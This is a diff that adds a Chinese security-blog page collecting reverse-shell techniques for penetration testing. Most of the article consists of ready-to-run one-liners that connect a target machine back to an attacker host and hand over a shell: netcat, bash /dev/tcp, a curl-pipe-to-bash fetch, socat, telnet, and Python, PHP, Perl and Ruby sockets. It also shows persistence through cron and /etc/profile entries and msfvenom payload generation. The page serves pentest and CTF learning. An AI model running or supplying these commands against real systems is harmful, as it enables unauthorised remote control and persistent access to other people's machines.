@@ -1,0 +1,212 @@
+<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="反弹shell姿势收集"><meta name="keywords" content="内网渗透,shell"><meta name="author" content="uf9n1x,1916003479@qq.com"><meta name="copyright" content="uf9n1x"><title>反弹shell姿势收集 | Uf9n1x's Blog</title><link rel="shortcut icon" href="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/avator3.JPG"><link rel="stylesheet" href="/css/index.css?version=1.9.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.1"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script src="https://v1.hitokoto.cn/?encode=js&amp;charset=utf-8&amp;select=.footer_custom_text" defer></script><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容:${query}"}},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  hexoVersion: '6.3.0'
+} </script><meta name="generator" content="Hexo 6.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="alternate" href="/atom.xml" title="Uf9n1x's Blog" type="application/atom+xml">
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x01 前言</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5"><span class="toc-number">1.1.</span> <span class="toc-text">正向连接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5"><span class="toc-number">1.2.</span> <span class="toc-text">反向连接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9%E6%96%B9%E5%BC%8F%E9%80%89%E5%8F%96"><span class="toc-number">1.3.</span> <span class="toc-text">反弹方式选取</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E5%88%A9%E7%94%A8netcat%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">2.</span> <span class="toc-text">0x02 利用netcat反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81nc%E6%9C%89-e%E9%80%89%E9%A1%B9%E5%8F%AF%E7%94%A8"><span class="toc-number">2.1.</span> <span class="toc-text">1、nc有-e选项可用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81nc%E6%97%A0-e%E9%80%89%E9%A1%B9%E5%8F%AF%E7%94%A8%E7%9A%84%E6%83%85%E5%86%B5"><span class="toc-number">2.2.</span> <span class="toc-text">2、nc无-e选项可用的情况</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E5%88%A9%E7%94%A8Bash%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">3.</span> <span class="toc-text">0x03 利用Bash反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Curl%E9%85%8D%E5%90%88Bash%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">3.1.</span> <span class="toc-text">Curl配合Bash反弹shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%86%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%91%BD%E4%BB%A4%E5%86%99%E5%85%A5%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1"><span class="toc-number">3.2.</span> <span class="toc-text">将反弹shell的命令写入定时任务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%86%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%91%BD%E4%BB%A4%E5%86%99%E5%85%A5-x2F-etc-x2F-profile%E6%96%87%E4%BB%B6"><span class="toc-number">3.3.</span> <span class="toc-text">将反弹shell的命令写入&#x2F;etc&#x2F;profile文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E5%88%A9%E7%94%A8Socat%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">4.</span> <span class="toc-text">0x04 利用Socat反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E5%88%A9%E7%94%A8Telnet%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">5.</span> <span class="toc-text">0x05 利用Telnet反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="toc-number">5.1.</span> <span class="toc-text">方法一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="toc-number">5.2.</span> <span class="toc-text">方法二</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-%E5%90%84%E7%A7%8D%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">6.</span> <span class="toc-text">0x06 各种脚本反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Python-%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">6.1.</span> <span class="toc-text">1. Python 脚本反弹shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-php-%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">6.2.</span> <span class="toc-text">2. php 脚本反弹shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Perl-%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">6.3.</span> <span class="toc-text">3. Perl 脚本反弹shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-Ruby%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">6.4.</span> <span class="toc-text">4. Ruby脚本反弹shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-%E4%BD%BF%E7%94%A8Metasploit%E7%94%9F%E6%88%90%E5%8F%8D%E5%BC%B9shell%E7%94%A8%E7%9A%84%E4%B8%80%E5%8F%A5%E8%AF%9D"><span class="toc-number">7.</span> <span class="toc-text">0x06 使用Metasploit生成反弹shell用的一句话</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-%E5%8F%8D%E5%BC%B9shell%E5%90%8E%E8%8E%B7%E5%8F%96%E6%A8%A1%E6%8B%9F%E7%BB%88%E7%AB%AF"><span class="toc-number">8.</span> <span class="toc-text">0x07 反弹shell后获取模拟终端</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-%E4%BD%BF%E7%94%A8OpenSSL%E5%8F%8D%E5%BC%B9%E5%8A%A0%E5%AF%86shell"><span class="toc-number">9.</span> <span class="toc-text">0x08 使用OpenSSL反弹加密shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#OpenSSL-%E7%AE%80%E4%BB%8B"><span class="toc-number">9.1.</span> <span class="toc-text">OpenSSL 简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8OpenSSL%E5%8F%8D%E5%BC%B9%E5%8A%A0%E5%AF%86shell"><span class="toc-number">9.2.</span> <span class="toc-text">使用OpenSSL反弹加密shell</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/avator3.JPG"></div><div class="author-info__name text-center">uf9n1x</div><div class="author-info__description text-center">websec</div><div class="follow-button"><a target="_blank" rel="noopener" href="https://github.com/uf9n1x">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">43</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">35</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">30</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Some links</div><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://www.cnblogs.com/uf9n1x/">博客园</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://www.yuque.com/uf9n1x">语雀</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://music.163.com/">Music</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://blog-1313934826.cos.ap-chengdu.myqcloud.com/normal-images/psc.png#https://s1.ax1x.com/2023/04/14/p9Sd0ns.png)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Uf9n1x's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">主页</a><a class="site-page" href="/archives">归档</a><a class="site-page" href="/categories">分类</a><a class="site-page" href="/tags">标签</a><a class="site-page" href="/about">About</a></span><span class="pull-right"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> 搜索</span></a></span></div><div id="post-info"><div id="post-title">反弹shell姿势收集</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2023-04-16</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a><div class="post-meta-wordcount"><span>字数总计: </span><span class="word-count">3.8k</span><span class="post-meta__separator">|</span><span>阅读时长: 13 分钟</span></div></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>这篇文章介绍反弹shell的一些姿势。</p>
+<span id="more"></span>
+
+<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a><strong>0x01 前言</strong></h2><p>在渗透测试实战中，我们经常会遇到Linux系统环境，而让Linux主机反弹个shell是再常见不过的事情了。</p>
+<p>反弹shell，就是攻击机监听在某个TCP/UDP端口为服务端，目标机主动发起请求到攻击机监听的端口，并将其命令行的输入输出转到攻击机。</p>
+<h3 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a><strong>正向连接</strong></h3><p>假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面、web服务、ssh、telnet等等都是正向连接。</p>
+<h3 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a><strong>反向连接</strong></h3><p>那么为什么要用反弹shell呢？</p>
+<p>反弹shell通常适用于如下几种情况：</p>
+<p><strong>•目标机因防火墙受限，目标机器只能发送请求，不能接收请求。</strong><br><strong>•目标机端口被占用。</strong><br><strong>•目标机位于局域网，或IP会动态变化，攻击机无法直接连接。</strong><br><strong>•对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知的。</strong><br><strong>•……</strong></p>
+<p>对于以上几种情况，我们是无法利用正向连接的，要用反向连接。</p>
+<p>那么反向连接就很好理解了，就是攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，即为反向连接。</p>
+<h3 id="反弹方式选取"><a href="#反弹方式选取" class="headerlink" title="反弹方式选取"></a>反弹方式选取</h3><p>反弹shell的方式有很多，那具体要用哪种方式还需要根据目标主机的环境来确定，比如目标主机上如果安装有netcat，那我们就可以利用netcat反弹shell，如果具有python环境，那我们可以利用python反弹shell。如果具有php环境，那我们可以利用php反弹shell。</p>
+<p>这里可以使用whereis命令去确定目标支持的反弹方法  ：</p>
+<pre class="line-numbers language-shell"><code class="language-shell">whereis nc bash python php exec lua perl ruby
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p> <img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161637682.png" alt="img"></p>
+<h2 id="0x02-利用netcat反弹shell"><a href="#0x02-利用netcat反弹shell" class="headerlink" title="0x02 利用netcat反弹shell"></a><strong>0x02 利用netcat反弹shell</strong></h2><p>Netcat 是一款简单的Unix工具，使用UDP和TCP协议。它是一个可靠的容易被其他程序所启用的后台操作工具，同时它也被用作网络的测试工具或黑客工具。使用它你可以轻易的建立任何连接。</p>
+<h3 id="1、nc有-e选项可用"><a href="#1、nc有-e选项可用" class="headerlink" title="1、nc有-e选项可用"></a>1、nc有-e选项可用</h3><p>目前，默认的各个linux发行版本已经自带了netcat工具包，但是可能由于处于安全考虑原生版本的netcat带有可以直接发布与反弹本地shell的功能参数 -e 都被阉割了</p>
+<p><img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161637599.png" alt="img"></p>
+<p>所以我们需要自己手动下载二进制安装包，安装的如下：</p>
+<pre class="line-numbers language-shell"><code class="language-shell">wget https://nchc.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gztar -xvzf netcat-0.7.1.tar.gz./configuremake && make installmake clean
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>安装完原生版本的 netcat 工具后，便有了netcat -e参数，我们就可以将本地bash反弹到攻击机上了。</p>
+<p><strong>攻击机开启本地监听：</strong></p>
+<pre class="line-numbers language-shell"><code class="language-shell">netcat -lvvp 2333
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><strong>目标机主动连接攻击机：</strong></p>
+<pre class="line-numbers language-shell"><code class="language-shell">nc 192.168.1.130 2333 -e /bin/bash
+nc <攻击机IP> <攻击机监听的端口> -e /bin/bash
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h3 id="2、nc无-e选项可用的情况"><a href="#2、nc无-e选项可用的情况" class="headerlink" title="2、nc无-e选项可用的情况"></a>2、nc无-e选项可用的情况</h3><pre class="line-numbers language-shell"><code class="language-shell">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.130 2333 >/tmp/f
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><strong>简单的解释：</strong></p>
+<p>mkfifo 命令首先创建了一个管道，cat 将管道里面的内容输出传递给/bin/sh，sh会执行管道里的命令并将标准输出和标准错误输出结果通过nc 传到该管道，由此形成了一个回路</p>
+<p><img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161637826.png" alt="img"></p>
+<p><img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161637918.png" alt="img"></p>
+<p>类似的命令：</p>
+<pre class="line-numbers language-shell"><code class="language-shell">mknod backpipe p; nc 192.168.1.130 2333 0<backpipe | /bin/bash 1>backpipe 2>backpipe
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="0x03-利用Bash反弹shell"><a href="#0x03-利用Bash反弹shell" class="headerlink" title="0x03 利用Bash反弹shell"></a><strong>0x03 利用Bash反弹shell</strong></h2><p>个人感觉反弹shell最好用的方法就是使用bash结合重定向方法的一句话，具体命令如下：</p>
+<pre class="line-numbers language-shell"><code class="language-shell">bash -i >& /dev/tcp/攻击机ip/2333 0>&1
+bash -c "bash -i >& /dev/tcp/攻击机ip/2333 0>&1"
+bash -i >& /dev/tcp/攻击机IP/攻击机端口 0>&1
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>以下是针对Bash反弹一句话进行了拆分说明：</p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>命令详解</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>bash -i</td>
+<td>产生一个bash交互环境。</td>
+</tr>
+<tr>
+<td>&gt;&amp;</td>
+<td>将混合输出（标准输出+标准错误输出）结合，然后一起重定向给后者。</td>
+</tr>
+<tr>
+<td>/dev/tcp/ip/2333</td>
+<td>Linux环境中所有的内容都是以文件的形式存在的，其实大家一看见这个内容就能明白，就是让目标主机与攻击机的2333端口建立一个tcp连接。</td>
+</tr>
+<tr>
+<td>0&gt;&amp;1</td>
+<td>将标准输入与标准输出的内容相结合，然后重定向给前面标准输出的内容。</td>
+</tr>
+</tbody></table>
+<p>Bash反弹一句完整的解读过程就是：</p>
+<p>Bash产生了一个交互环境和本地主机主动发起与攻击机2333端口建立的连接（即TCP 2333会话连接）相结合，然后在重定向个TCP 2333会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个Bash反弹环境。</p>
+<p><strong>攻击机开启本地监听：</strong></p>
+<pre class="line-numbers language-shell"><code class="language-shell">nc -lvvp 2333
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><strong>目标机主动连接攻击机：</strong></p>
+<pre class="line-numbers language-shell"><code class="language-shell">bash -i >& /dev/tcp/192.168.1.130/2333 0>&1
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="Curl配合Bash反弹shell"><a href="#Curl配合Bash反弹shell" class="headerlink" title="Curl配合Bash反弹shell"></a><strong>Curl配合Bash反弹shell</strong></h3><p>这里操作也很简单，借助了Linux中的管道。</p>
+<p>首先，在攻击者vps的web目录里面创建一个index文件（index.php或index.html），内容如下：</p>
+<pre class="line-numbers language-shell"><code class="language-shell">bash -i >& /dev/tcp/攻击方ip/2333 0>&1
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>并开启2333端口的监听。</p>
+<pre class="line-numbers language-shell"><code class="language-shell">nc -lvp 2333
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>然后再目标机上执行如下，即可反弹shell：</p>
+<pre class="line-numbers language-shell"><code class="language-shell">curl 攻击方ip|bash
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>根据curl命令和Linux管道的作用，你不难理解这其中的原理。</p>
+<p>注：Curl配合Bash反弹shell的方式在CTF题目中经常出现，curl IP|bash 中的IP可以是任意格式的，可以是十进制、十六进制、八进制、二进制等等。</p>
+<h3 id="将反弹shell的命令写入定时任务"><a href="#将反弹shell的命令写入定时任务" class="headerlink" title="将反弹shell的命令写入定时任务"></a><strong>将反弹shell的命令写入定时任务</strong></h3><p>我们可以在目标主机的定时任务文件中写入一个反弹shell的脚本，但是前提是我们必须要知道目标主机当前的用户名是哪个。因为我们的反弹shell命令是要写在 /var/spool/cron/[crontabs]/<username> 内的，所以必须要知道远程主机当前的用户名。否则就不能生效。</username></p>
+<pre class="line-numbers language-shell"><code class="language-shell">*/1  *  *  *  *   /bin/bash -i>&/dev/tcp/攻击方ip/2333 0>&1
+#每隔一分钟，向攻击方的2333号端口发送shell
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>比如，当前用户名为root，我们就要写入到 /var/spool/cron/root 中。(centos系列主机)</p>
+<p>比如，当前用户名为root，我们就要写入到 /var/spool/cron/crontabs/root 中。(Debian/Ubuntu系列主机)</p>
+<h3 id="将反弹shell的命令写入-x2F-etc-x2F-profile文件"><a href="#将反弹shell的命令写入-x2F-etc-x2F-profile文件" class="headerlink" title="将反弹shell的命令写入/etc/profile文件"></a><strong>将反弹shell的命令写入/etc/profile文件</strong></h3><p>将以下反弹shell的命写入/etc/profile文件中，/etc/profile中的内容会在用户打开bash窗口时执行。</p>
+<pre class="line-numbers language-shell"><code class="language-shell">/bin/bash -i >& /dev/tcp/ip/2333 0>&1 &
+# 最后面那个&为的是防止管理员无法输入命令
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>当目标主机管理员远程连接该主机时，就会执行该命令，成功获得目标机的shell：</p>
+<h2 id="0x04-利用Socat反弹shell"><a href="#0x04-利用Socat反弹shell" class="headerlink" title="0x04 利用Socat反弹shell"></a><strong>0x04 利用Socat反弹shell</strong></h2><p>Socat是Linux 下一个多功能的网络工具，名字来由是”Socket CAT”，因此可以看出它是基于socket的，其功能与netcat类似，不过据说可以看做netcat的加强版，事实上的确也是如此。我这里只简单的介绍下怎么使用它开启监听和反弹shell,其他详细内容可以参见这里：</p>
+<p><a target="_blank" rel="noopener" href="http://brieflyx.me/2015/linux-tools/socat-introduction/">http://brieflyx.me/2015/linux-tools/socat-introduction/</a></p>
+<p>安装Socat的方法很简单：</p>
+<p>•Ubuntu等可以直接使用 apt-get install socat 命令进行安装</p>
+<p>也可以去官网下载源码包：<a target="_blank" rel="noopener" href="http://www.dest-unreach.org/socat">http://www.dest-unreach.org/socat</a></p>
+<p><strong>攻击机开启本地监听：</strong></p>
+<pre class="line-numbers language-shell"><code class="language-shell">socat TCP-LISTEN:2333 -或nc -lvvp 2333
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><strong>目标机主动连接攻击机：</strong></p>
+<pre class="line-numbers language-shell"><code class="language-shell">socat tcp-connect:攻击方ip:2333 exec:'bash -li',pty,stderr,setsid,sigint,sane
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="0x05-利用Telnet反弹shell"><a href="#0x05-利用Telnet反弹shell" class="headerlink" title="0x05 利用Telnet反弹shell"></a><strong>0x05 利用Telnet反弹shell</strong></h2><p>当nc和/dev/tcp不可用，且目标主机和攻击机上支持Telnet服务时，我们可以使用Telnet反弹shell。</p>
+<h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a><strong>方法一</strong></h3><p><strong>攻击机开启本地监听：</strong></p>
+<pre class="line-numbers language-shell"><code class="language-shell">nc -lvvp 2333
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><strong>目标机主动连接攻击机：</strong></p>
+<pre class="line-numbers language-shell"><code class="language-shell">mknod a p; telnet 攻击方ip 2333 0<a | /bin/bash 1>a
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a><strong>方法二</strong></h3><p><strong>攻击机需要开启两个本地监听：</strong></p>
+<pre class="line-numbers language-shell"><code class="language-shell">nc -lvvp 2333nc -lvvp 4000
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><strong>目标机主动连接攻击机：</strong></p>
+<pre class="line-numbers language-shell"><code class="language-shell">telnet 攻击机ip 2333 | /bin/bash | telnet 攻击机ip 4000
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><strong>获得shell后，在攻击机2333端口的终端上输入的命令会在目标机上执行，执行的回显将通过4000端口的终端显示出来。</strong></p>
+<h2 id="0x06-各种脚本反弹shell"><a href="#0x06-各种脚本反弹shell" class="headerlink" title="0x06 各种脚本反弹shell"></a><strong>0x06 各种脚本反弹shell</strong></h2><h3 id="1-Python-脚本反弹shell"><a href="#1-Python-脚本反弹shell" class="headerlink" title="1. Python 脚本反弹shell"></a><strong>1. Python 脚本反弹shell</strong></h3><p>当目标主机上有python环境时，我们可以用Python来反弹shell。Python在现在一般发行版Linux系统中都会自带，所以使用起来也较为方便，即使没有安装，我们手动安装也很方便。</p>
+<p><strong>攻击机开启本地监听：</strong></p>
+<pre class="line-numbers language-shell"><code class="language-shell">nc -lvvp 2333
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><strong>目标机主动连接攻击机：</strong></p>
+<pre class="line-numbers language-python"><code class="language-python">python <span class="token operator">-</span>c <span class="token string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.130",2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>执行效果如下：</p>
+<p><img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161637965.png" alt="img"></p>
+<p><img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161637763.png" alt="img"></p>
+<h3 id="2-php-脚本反弹shell"><a href="#2-php-脚本反弹shell" class="headerlink" title="2. php 脚本反弹shell"></a><strong>2. php 脚本反弹shell</strong></h3><p>当目标主机上有php环境时，我们可以用php来反弹shell。</p>
+<p><strong>攻击机开启本地监听：</strong></p>
+<pre class="line-numbers language-python"><code class="language-python">nc <span class="token operator">-</span>lvvp <span class="token number">2333</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><strong>目标机主动连接攻击机：</strong></p>
+<pre class="line-numbers language-python"><code class="language-python">php <span class="token operator">-</span>r <span class="token string">'$sock=fsockopen("192.168.1.130",2333);exec("/bin/sh -i &lt;&amp;3 >&amp;3 2>&amp;3");'</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="3-Perl-脚本反弹shell"><a href="#3-Perl-脚本反弹shell" class="headerlink" title="3. Perl 脚本反弹shell"></a><strong>3. Perl 脚本反弹shell</strong></h3><p>当目标主机上有perl环境时，我们可以用perl来反弹shell。</p>
+<p><strong>攻击机开启本地监听：</strong></p>
+<pre class="line-numbers language-python"><code class="language-python">nc <span class="token operator">-</span>lvvp <span class="token number">2333</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><strong>目标机主动连接攻击机：</strong></p>
+<pre class="line-numbers language-python"><code class="language-python">perl <span class="token operator">-</span>e <span class="token string">'use Socket;$i="攻击机ip";$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&amp;S");open(STDOUT,">&amp;S");open(STDERR,">&amp;S");exec("/bin/sh -i");};'</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="4-Ruby脚本反弹shell"><a href="#4-Ruby脚本反弹shell" class="headerlink" title="4. Ruby脚本反弹shell"></a><strong>4. Ruby脚本反弹shell</strong></h3><p>当目标主机上有ruby环境时，我们可以用ruby来反弹shell。</p>
+<p><strong>攻击机开启本地监听：</strong></p>
+<pre class="line-numbers language-python"><code class="language-python">nc <span class="token operator">-</span>lvvp <span class="token number">2333</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><strong>目标机主动连接攻击机：</strong></p>
+<pre class="line-numbers language-python"><code class="language-python">ruby <span class="token operator">-</span>rsocket <span class="token operator">-</span>e <span class="token string">'c=TCPSocket.new("攻击机ip","2333");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'</span>或ruby <span class="token operator">-</span>rsocket <span class="token operator">-</span>e <span class="token string">'exit if fork;c=TCPSocket.new("47.xxx.xxx.72","2333");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="0x06-使用Metasploit生成反弹shell用的一句话"><a href="#0x06-使用Metasploit生成反弹shell用的一句话" class="headerlink" title="0x06 使用Metasploit生成反弹shell用的一句话"></a><strong>0x06 使用Metasploit生成反弹shell用的一句话</strong></h2><p>强大的Metasploit框架也为我们提供了生成一句话反弹shell的工具，即msfvenom，绝对的实用。当我们不记得前面说的所有反弹shell的反弹语句时，只要我们有Metasploit，那么我们随时都可以使用 msfvenom -l 来查询生成我们所需要的各类命令行一句话，具体使用方法如下。</p>
+<p>我们直接可以使用 msfvenom -l 结合关键字过滤（如cmd/unix/reverse），列出我们需要生成的各类反弹shell一句话的payload：</p>
+<pre class="line-numbers language-python"><code class="language-python">msfvenom <span class="token operator">-</span>l payloads <span class="token operator">|</span> grep <span class="token string">'cmd/unix/reverse'</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>metasploit支持生成反弹shell一句话的类型非常丰富，大家可以依据渗透测试对象自行选择使用。比如，我们获取一个python反弹shell的一句话：</p>
+<pre class="line-numbers language-python"><code class="language-python">msfvenom <span class="token operator">-</span>p cmd<span class="token operator">/</span>unix<span class="token operator">/</span>reverse_python LHOST<span class="token operator">=</span>攻击机ip LPORT<span class="token operator">=</span><span class="token number">2333</span> <span class="token operator">-</span>f raw
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
